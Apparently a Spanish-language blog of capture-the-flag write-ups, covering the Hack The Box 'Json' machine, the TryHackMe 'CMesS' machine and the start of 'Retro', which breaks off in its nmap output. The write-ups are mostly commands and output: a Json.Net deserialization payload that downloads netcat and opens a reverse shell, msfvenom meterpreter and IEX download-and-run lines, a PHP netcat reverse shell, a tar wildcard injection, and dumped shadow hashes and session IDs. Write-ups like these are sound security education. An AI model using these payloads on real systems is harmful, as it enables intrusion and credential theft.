Dificultad Media   IP 10.10.10.158   Maker Cyb3rb0b    MASSCAN \u0026amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  root@kali:~/htb/json# masscan -p1-65535,U:1-65535 10.10.10.158 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-30 22:56:02 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49153/tcp on 10.10.10.158 Discovered open port 445/tcp on 10.10.10.158 Discovered open port 5985/tcp on 10.10.10.158 Discovered open port 139/tcp on 10.10.10.158 Discovered open port 49155/tcp on 10.10.10.158 Discovered open port 135/tcp on 10.10.10.158 Discovered open port 47001/tcp on 10.10.10.158 Discovered open port 49157/tcp on 10.10.10.158 Discovered open port 21/tcp on 10.10.10.158 Discovered open port 49152/tcp on 10.10.10.158 # Nmap 7.80 scan initiated Mon Sep 30 19:14:28 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.158 Warning: 10.10.10.158 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.158 Host is up (0.23s latency). Not shown: 64567 closed ports, 954 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5985/tcp open wsman 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown # Nmap done at Mon Sep 30 19:19:17 2019 -- 1 IP address (1 host up) scanned in 289.09 seconds # Nmap 7.80 scan initiated Mon Sep 30 19:20:55 2019 as: nmap -p 21,80,135,139,445,5985,47001 -sV -sC -o services_script.nmap 10.10.10.158 Nmap scan report for 10.10.10.158 Host is up (0.56s latency). PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 135/tcp open msrpc? 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 4h00m42s, deviation: 0s, median: 4h00m42s |_nbstat: NetBIOS name: JSON, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:bd:94:b0 (VMware) |_smb-os-discovery: ERROR: Script execution failed (use -d to debug) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-10-01T03:24:25 |_ start_date: 2019-10-01T00:14:50 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Sep 30 19:24:33 2019 -- 1 IP address (1 host up) scanned in 217.67 seconds   FTP Intentamos logearnos al servicio ftp con el usuario y contraseña anonymous pero no esta autorizado el usuario, tambien podemos ver la version del servicio ftp.\nGOBUSTER Algunos directorios y paginas encontradas con gobuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.158 [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html [+] No status: true [+] Timeout: 10s =============================================================== 2019/09/30 20:23:11 Starting gobuster =============================================================== /css /files /img /index.html /Index.html /index.html /js /login.html /Login.html /views =============================================================== 2019/09/30 20:35:16 Finished ===============================================================   /index.html Visitamos el index de la pagina y nos muestra una plataforma.\n/login.html Vemos una pagina de inicio de sesion en esta pagina.\nVerificamos las peticiones en index.html y encontramos que en el header existe una Cookie del tipo OAuth2 y tambien.\nDecodificamos el string en base64 vemos el usuario y contraseña de admin.\n1  {\u0026#34;Id\u0026#34;:1,\u0026#34;UserName\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;Password\u0026#34;:\u0026#34;21232f297a57a5a743894a0e4a801fc3\u0026#34;,\u0026#34;Name\u0026#34;:\u0026#34;User Admin HTB\u0026#34;,\u0026#34;Rol\u0026#34;:\u0026#34;Administrator\u0026#34;}   Buscamos el hash del usuario admin en crackstation, el cual no sirve de nada.\n1  21232f297a57a5a743894a0e4a801fc3:admin   Enviamos una solicitud erronea en base64, la cual contenia un mensaje: \u0026ldquo;Lorem ipsum\u0026rdquo;.\nVemos que dentro del mensaje de error nos muestra \u0026ldquo;Cannot deserialize Json.Net Object\u0026rdquo;.\nJson.net RCE - Deserialization Investigamos acerca del framework Json.net y vemos que existe una vulnerabilidad.\nJson Attacks\nUtilizamos ysoserial.net para poder generar nuestro payload codificado y enviarlo a la maquina, para esto utilizamos el PoC y lo modificamos.\nPoC:\n1 2 3 4 5 6 7 8 9  { \u0026#39;$type\u0026#39;:\u0026#39;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\u0026#39;, \u0026#39;MethodName\u0026#39;:\u0026#39;Start\u0026#39;, \u0026#39;MethodParameters\u0026#39;:{ \u0026#39;$type\u0026#39;:\u0026#39;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39;, \u0026#39;$values\u0026#39;:[\u0026#39;cmd\u0026#39;,\u0026#39;/c calc\u0026#39;] }, \u0026#39;ObjectInstance\u0026#39;:{\u0026#39;$type\u0026#39;:\u0026#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39;} }   Realizamos dos pruebas uno para hacer ping a nuestra maquina local y uno para hacer una prueba de resolucion de dominios.\n1 2 3  ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c \u0026#34;ping -n 5 10.10.14.147\u0026#34; -t \u0026gt; payload_jsonnet_ping.txt ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgcGluZyAtbiA1IDEwLjEwLjE0LjE0NyddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9   1 2 3  ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c \u0026#34;nslookup sckull 10.10.14.147\u0026#34; -t \u0026gt; payload_jsonnet_nslookup.txt ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgbnNsb29rdXAgc2NrdWxsIDEwLjEwLjE0LjE0NyddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9   Respuesta en Responder (nslookup) y tcpdump (ping).\nSHELL - userpool Tomamos el PoC que utilizamos para hacer ping a nuestra maquina y lo modificamos agregandole un comando de powershell para descargar netcat (nc.exe) y, al mismo tiempo ejecutar una shell inversa con netcat.\nComando:\n1  powershell -Command \u0026#34;Invoke-WebRequest http://10.10.14.147/nc.exe -OutFile c:/Users/Public/nc.exe\u0026#34; \u0026amp; C:/Users/Public/nc.exe -e cmd.exe 10.10.14.147 7878   Payload:\n1 2 3 4 5 6 7 8 9  { \u0026#39;$type\u0026#39;:\u0026#39;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\u0026#39;, \u0026#39;MethodName\u0026#39;:\u0026#39;Start\u0026#39;, \u0026#39;MethodParameters\u0026#39;:{ \u0026#39;$type\u0026#39;:\u0026#39;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39;, \u0026#39;$values\u0026#39;:[\u0026#39;cmd\u0026#39;,\u0026#39;/c powershell -Command \u0026#34;Invoke-WebRequest http://10.10.14.147/nc.exe -OutFile c:/Users/Public/nc.exe\u0026#34; \u0026amp; C:/Users/Public/nc.exe -e cmd.exe 10.10.14.147 7878 \u0026#39;] }, \u0026#39;ObjectInstance\u0026#39;:{\u0026#39;$type\u0026#39;:\u0026#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39;} }   Payload Base64:\n1  ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgcG93ZXJzaGVsbCAtQ29tbWFuZCAiSW52b2tlLVdlYlJlcXVlc3QgaHR0cDovLzEwLjEwLjE0LjE0Ny9uYy5leGUgLU91dEZpbGUgYzovVXNlcnMvUHVibGljL25jLmV4ZSIgJiBDOi9Vc2Vycy9QdWJsaWMvbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMTQ3IDc4NzggJ10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0NCg==   Codificamos el payload en base64 y lo enviamos, y obtenemos una shell inversa con el usuario userpool.\nY obtenemos nuestra flag user.txt.\nPrivilege Escalation Realizamos una enumeracion de los privilegios del usuario userpool, vemos que tenemos habilitado\nSeImpersonatePrivilege, para esta maquina y estos privilegios utilizamos JuicyPotato. Utilizamos la forma \u0026ldquo;automatica\u0026rdquo; de JuicyPotato. Realizamos las siguientes modificaciones en los archivos.\n1 2 3  Invoke-LovelyPotato.ps1 $RemoteDir = \u0026#34;http://10.10.14.147\u0026#34; $LocalPath = \u0026#34;C:/Users/Public\u0026#34;   Creamos nuestro payload con Msfvenom:\n1  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.147 LPORT=1339 -f exe -o meterpreter.exe   Configuramos metasploit:\n1 2 3 4  use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.10.14.147 set LPORT 1339   Descargamos el archivo de \u0026ldquo;automatizacion\u0026rdquo; de JuicyPotato:\n1  powershell -Command \u0026#34;IEX(New-Object Net.WebClient).DownloadString(\u0026#39;http://10.10.14.147/Invoke-LovelyPotato.ps1\u0026#39;)\u0026#34;   Si queremos realizarlo de forma manual podemos realizar los mismos pasos de la Maquina Conceal.\nAl terminar la ejecucion del script obtenemos nuestra shell en meterpreter.\nY nuestra flag root.txt.\n","description":"","id":49,"section":"posts","tags":["windows"],"title":"Hack The Box - Json","uri":"https://sckull.github.io/posts/json/"},{"content":"CMesS es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo CMesS     Info Can you root this Gila CMS box?   Puntos 1155   Dificultad Media   Maker Optional    NMAP Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  # Nmap 7.80 scan initiated Fri Feb 14 16:24:08 2020 as: nmap -p- -T4 -Pn -sV -sC -o nmap_scan 10.10.46.144 Nmap scan report for 10.10.46.144 Host is up (0.24s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA) | 256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA) |_ 256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: Gila CMS | http-robots.txt: 3 disallowed entries |_/src/ /themes/ /lib/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 14 16:45:03 2020 -- 1 IP address (1 host up) scanned in 1254.76 seconds   HTTP A un principio veimas Gila CMS en el cual existe una vulnerabilidad de LFI pero el de esta maquina no es vulnerable.\nGOBUSTER Encontramos una larga lista de directorios, pero ninguno era de importancia hasta el momento.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  root@aoiri:~/tryhackme/cmess# gobuster dir -u cmess.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -q -t 35 /1 (Status: 200) /about (Status: 200) /01 (Status: 200) /login (Status: 200) /search (Status: 200) /blog (Status: 200) /index (Status: 200) /category (Status: 200) /0 (Status: 200) /feed (Status: 200) /themes (Status: 301) /admin (Status: 200) /assets (Status: 301) /tag (Status: 200) /author (Status: 200) /sites (Status: 301) /log (Status: 301) /tags (Status: 200) /1x1 (Status: 200) /lib (Status: 301) /src (Status: 301) /api (Status: 200) /robots.txt (Status: 200) /001 (Status: 200) /1pix (Status: 200) /fm (Status: 200) /tmp (Status: 301) /1a (Status: 200) /0001 (Status: 200) /1x1transparent (Status: 200) /1px (Status: 200) /1d (Status: 200) /1_1 (Status: 200) /1pixel (Status: 200) /0001-exploits (Status: 200) /01_hello (Status: 200) /1-1 (Status: 200) /1st (Status: 200) /00000001 (Status: 200)   WFUZZ - SUBDOMAINS Utilizamos wfuzz para poder enumerar los subdominios de la maquina, encontramos *** de subdominio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  root@aoiri:~/tryhackme/cmess# wfuzz -c -w subdomains-top1mil-5000.txt -u \u0026#34;http://cmess.thm\u0026#34; -H \u0026#34;Host: FUZZ.cmess.thm\u0026#34; --hl 107 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 2.4 - The Web Fuzzer * ******************************************************** Target: http://cmess.thm/ Total requests: 5000 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000000019: 200 30 L 104 W 934 Ch \u0026#34;***\u0026#34; 000002700: 400 12 L 53 W 422 Ch \u0026#34;m.\u0026#34; 000002795: 400 12 L 53 W 422 Ch \u0026#34;ns2.cl.bellsouth.net.\u0026#34; 000002883: 400 12 L 53 W 422 Ch \u0026#34;ns1.viviotech.net.\u0026#34; 000002885: 400 12 L 53 W 422 Ch \u0026#34;ns2.viviotech.net.\u0026#34; 000003050: 400 12 L 53 W 422 Ch \u0026#34;ns3.cl.bellsouth.net.\u0026#34; 000004081: 400 12 L 53 W 422 Ch \u0026#34;ferrari.fortwayne.com.\u0026#34; 000004082: 400 12 L 53 W 422 Ch \u0026#34;jordan.fortwayne.com.\u0026#34; 000004083: 400 12 L 53 W 422 Ch \u0026#34;quatro.oweb.com.\u0026#34; Total time: 131.3119 Processed Requests: 5000 Filtered Requests: 4991 Requests/sec.: 38.07726   ***.cmess.thm En el subdominio dev encontramos una contraseña del correo andre.\nSHELL - www-data Utilizamos las credenciales en el panel de administracion (/admin) con las credenciales que tenemos, una vez dentro subimos un archivo PHP de prueba para verificar que podamos ejecutar comandos, el archivo se subió en (/assets/).\n1 2 3 4  \u0026lt;?php echo \u0026#34;Testing if i can run commands:\u0026#34;; echo(exec(\u0026#34;ls \u0026#34;));   Vemos que nuestro codigo se ejecuto:\nEditamos el codigo para ejecutar una shell inversa:\n1 2 3  \u0026lt;?php exec(\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 7878 \u0026gt;/tmp/f\u0026#34;); echo \u0026#34;\u0026gt;:)\u0026#34;;   Andre - User Enumeramos la maquina en busca de archivos interesantes, en la carpeta /opt encontramos un backup de la contraseña de Andre.\n1 2 3 4 5 6 7 8 9 10 11 12 13  www-data@cmess:/$ ls -lah opt ls -lah opt total 12K drwxr-xr-x 2 root root 4.0K Feb 6 18:54 . drwxr-xr-x 22 root root 4.0K Feb 6 17:57 .. -rwxrwxrwx 1 root root 36 Feb 6 18:54 .password.bak www-data@cmess:/$ cd opt cd opt www-data@cmess:/opt$ cat .password.bak cat .password.bak andres backup password UQ[... snip ...]P6 www-data@cmess:/opt$   Utilizamos \u0026lsquo;su\u0026rsquo;, obtenemos una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Dentro de los archivos de la carpeta /tmp encontramos un archivo comprimido, de lo que parece /home/andre/backup/, que, la realiza el usuario root cada minuto. Para ver el cambio del archivo utilizamos date para ver la fecha de creacion y hora. Con lo anterior, renombramos la carpeta backup a backup_bak, creamos un symlink hacia la carpeta /root/, el usuario root realizara un backup de la carpeta /root/.\nO simplemente utilizar cat /etc/crontab para ver los crons xD\nAl pasar un minuto, vemos que la hora de creacion cambio y al extraer los archivos podemos ver nuestra flag root.txt.\nDe la misma forma podemos obtener la contraseña del usuario root (crackeada) haciendo un symlink hacia la carpeta /etc/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  andre@cmess:~$ ln -s /etc/ backup andre@cmess:~$ ls -lah total 3.0M drwxr-x--- 4 andre andre 4.0K Feb 14 18:27 . drwxr-xr-x 3 root root 4.0K Feb 6 18:00 .. lrwxrwxrwx 1 andre andre 11 Feb 14 18:27 backup -\u0026gt; /etc/ drwxr-x--- 2 andre andre 4.0K Feb 14 17:44 backup_bak lrwxrwxrwx 1 root root 9 Feb 6 18:48 .bash_history -\u0026gt; /dev/null -rwxr-x--- 1 andre andre 220 Feb 6 18:00 .bash_logout -rwxr-x--- 1 andre andre 3.7K Feb 6 18:00 .bashrc drwxr-x--- 2 andre andre 4.0K Feb 6 18:01 .cache -rwxr-x--- 1 andre andre 655 Feb 6 18:00 .profile -rwxrwxr-x 1 andre andre 3.0M Aug 22 11:38 pspy64 lrwxrwxrwx 1 root root 9 Feb 6 18:48 .sudo_as_admin_successful -\u0026gt; /dev/null -rwxr-x--- 1 andre andre 38 Feb 6 18:46 user.txt -rwxr-x--- 1 andre andre 635 Feb 9 11:00 .viminfo andre@cmess:~$ date Fri Feb 14 18:27:05 PST 2020 andre@cmess:~$   Descomprimimos el archivo y obtenemos la contraseña encriptada:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  andre@cmess:/tmp$ ls |grep sha gshadow gshadow- shadow shadow- andre@cmess:/tmp$ cat shadow root:$6$W.gDTDR8$XXB79ORIcggP9.Cl2HzbUf[... snip ...]sdXoYOhB7Da9mFPcca5a3DyKG1:18299:0:99999:7::: daemon:*:17953:0:99999:7::: bin:*:17953:0:99999:7::: sys:*:17953:0:99999:7::: sync:*:17953:0:99999:7::: games:*:17953:0:99999:7::: man:*:17953:0:99999:7::: lp:*:17953:0:99999:7::: mail:*:17953:0:99999:7::: news:*:17953:0:99999:7::: uucp:*:17953:0:99999:7::: proxy:*:17953:0:99999:7::: www-data:*:17953:0:99999:7::: backup:*:17953:0:99999:7::: list:*:17953:0:99999:7::: irc:*:17953:0:99999:7::: gnats:*:17953:0:99999:7::: nobody:*:17953:0:99999:7::: systemd-timesync:*:17953:0:99999:7::: systemd-network:*:17953:0:99999:7::: systemd-resolve:*:17953:0:99999:7::: systemd-bus-proxy:*:17953:0:99999:7::: syslog:*:17953:0:99999:7::: _apt:*:17953:0:99999:7::: messagebus:*:18299:0:99999:7::: uuidd:*:18299:0:99999:7::: andre:$6$GeMRsVKt$KEQmO.oV7yzpLOVXjDX[... snip ...]uzhMTMl5J8rstkFQ1QD3/dLFS1yAMqj1kbiQWYvQ8.:18299:0:99999:7::: mysql:!:18299:0:99999:7::: sshd:*:18299:0:99999:7::: andre@cmess:/tmp$   SHELL - ROOT Para obtener una shell con el usuario root utilizamos las \u0026lsquo;wildcards\u0026rsquo; para ejecutar una shell inversa. Creamos un archivo con nuestra shell inversa y las \u0026lsquo;wildcards\u0026rsquo; que se ejecutarán junto con el comando tar:\n1 2 3  echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 8989 \u0026gt;/tmp/f\u0026#34; \u0026gt; shell.sh echo \u0026#34;\u0026#34;\u0026gt; \u0026#34;--checkpoint-action=exec=sh shell.sh\u0026#34; echo \u0026#34;\u0026#34;\u0026gt; --checkpoint=1   Verificamos:\n1 2 3  andre@cmess:~/backup$ ls --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh andre@cmess:~/backup$   Esperamos y obtenemos una shell root:\nINFO - Wildcard Privilege Escalation\nMYSQL Dentro de la configuracion de la pagina vemos las credenciales para conectarse a la base de datos, encontramos algunas tablas interesantes pero ningun dato nos ayudo para ninguno de los usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  www-data@cmess:/var/www/html$ cat config.php cat config.php \u0026lt;?php $GLOBALS[\u0026#39;config\u0026#39;] = array ( \u0026#39;db\u0026#39; =\u0026gt; array ( \u0026#39;host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;user\u0026#39; =\u0026gt; \u0026#39;root\u0026#39;, \u0026#39;pass\u0026#39; =\u0026gt; \u0026#39;r0otus3rpassw0rd\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;gila\u0026#39;, ), \u0026#39;permissions\u0026#39; =\u0026gt; array ( 1 =\u0026gt; array ( 0 =\u0026gt; \u0026#39;admin\u0026#39;, 1 =\u0026gt; \u0026#39;admin_user\u0026#39;, 2 =\u0026gt; \u0026#39;admin_userrole\u0026#39;, ), ), \u0026#39;packages\u0026#39; =\u0026gt; array ( 0 =\u0026gt; \u0026#39;blog\u0026#39;, ), \u0026#39;base\u0026#39; =\u0026gt; \u0026#39;http://cmess.thm/gila/\u0026#39;, \u0026#39;theme\u0026#39; =\u0026gt; \u0026#39;gila-blog\u0026#39;, \u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Gila CMS\u0026#39;, \u0026#39;slogan\u0026#39; =\u0026gt; \u0026#39;An awesome website!\u0026#39;, \u0026#39;default-controller\u0026#39; =\u0026gt; \u0026#39;blog\u0026#39;, \u0026#39;timezone\u0026#39; =\u0026gt; \u0026#39;America/Mexico_City\u0026#39;, \u0026#39;ssl\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;env\u0026#39; =\u0026gt; \u0026#39;pro\u0026#39;, \u0026#39;check4updates\u0026#39; =\u0026gt; 1, \u0026#39;language\u0026#39; =\u0026gt; \u0026#39;en\u0026#39;, \u0026#39;admin_email\u0026#39; =\u0026gt; \u0026#39;andre@cmess.thm\u0026#39;, \u0026#39;rewrite\u0026#39; =\u0026gt; true, );www-data@cmess:/var/www/html$   Utilizamos las credenciales con mysql, y en la tabla users de la base de datos gila encontramos la contraseña encriptada del usuario andre, ademas de eso encontramos las cookies del usuario andre:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  mysql\u0026gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | gila | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.00 sec) mysql\u0026gt; use gila; use gila; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +----------------+ | Tables_in_gila | +----------------+ | option | | page | | post | | postcategory | | postmeta | | user | | usermeta | | userrole | | widget | +----------------+ 9 rows in set (0.00 sec) mysql\u0026gt; select * from user; select * from user; +----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+ | id | username | email | pass | active | reset_code | created | updated | +----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+ | 1 | andre | andre@cmess.thm | $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa | 1 | | 2020-02-06 18:20:34 | 2020-02-06 18:20:34 | +----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from usermeta; select * from usermeta; +----+---------+------------+----------------------------------------------------+ | id | user_id | vartype | value | +----+---------+------------+----------------------------------------------------+ | 1 | 1 | privilege | admin | | 2 | 1 | GSESSIONID | 1ik2ha97chatolvcena3moomw802zssf3e9tdo9v9fwl86w0uv | | 3 | 1 | GSESSIONID | 1mwxigp2xzt4oc6ka9neshxlzrnwefvsmenppbod9826mmhikz | +----+---------+------------+----------------------------------------------------+ 3 rows in set (0.00 sec)   ","description":"","id":50,"section":"posts","tags":["linux"],"title":"TryHackMe - CMesS","uri":"https://sckull.github.io/posts/cmess/"},{"content":"Retro es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Retro     Info New high score!   Puntos 1095   Dificultad Media   Maker DarkStar7471    NMAP Escaneo de puertos tcp, nmap nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  # Nmap 7.80 scan initiated Thu Feb 13 16:45:26 2020 as: nmap -p- -T4 -Pn -sV -sC -o nmap_scan 10.10.69.12 Nmap scan report for 10.10.69.12 Host is up (0.23s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=RetroWeb | Not valid before: 2019-12-07T23:49:24 |_Not valid after: 2020-06-07T23:49:24 